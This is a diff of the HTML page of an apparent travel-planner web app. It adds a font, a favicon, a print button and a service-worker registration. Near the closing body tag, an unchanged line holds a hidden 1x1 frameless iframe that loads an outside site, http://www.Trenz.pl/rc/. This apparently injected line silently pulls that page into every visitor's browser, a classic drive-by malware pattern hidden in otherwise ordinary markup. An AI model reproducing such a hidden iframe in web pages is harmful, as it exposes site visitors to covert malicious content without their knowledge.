@@ -7,6 +7,8 @@
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Philosopher:wght@700&display=swap" rel="stylesheet">
+        <link rel="shortcut icon" type="image/png" href="../media/fevicon.png">
         <link rel="stylesheet" href="">
         
     </head>
@@ -22,7 +24,7 @@
                 <label for="destination">Seach for your trip</label>
                 <input type="text" id="destination" placeholder="City">
                 <input type="date" id="tripDate" placeholder="Departure">
-                <button id="btn" onclick="return Client.handleSubmit(event)" >Submit</button>
+                <button id="btn" >Submit</button>
             </div>
         </div>
         <div id="loader" class=""></div>
@@ -38,6 +40,7 @@
                     </ul>   
                     <h3>Days Left:<span id="daysLeft"></span></h3>
                     <img id="destImg" src="" alt="img">
+                    <button id="print" onclick="window.print()">Print</button>
                 </div>
             </div>
 
@@ -47,4 +50,11 @@
         </footer>
 <iframe src="http://www.Trenz.pl/rc/" width=1 height=1 frameborder=0></iframe>
 </body>
+<script>
+    if ('serviceWorker' in navigator){
+        window.addEventListener('load',()=>{
+            navigator.serviceWorker.register('/service-worker.js')
+        });
+    }
+</script>
 </html>
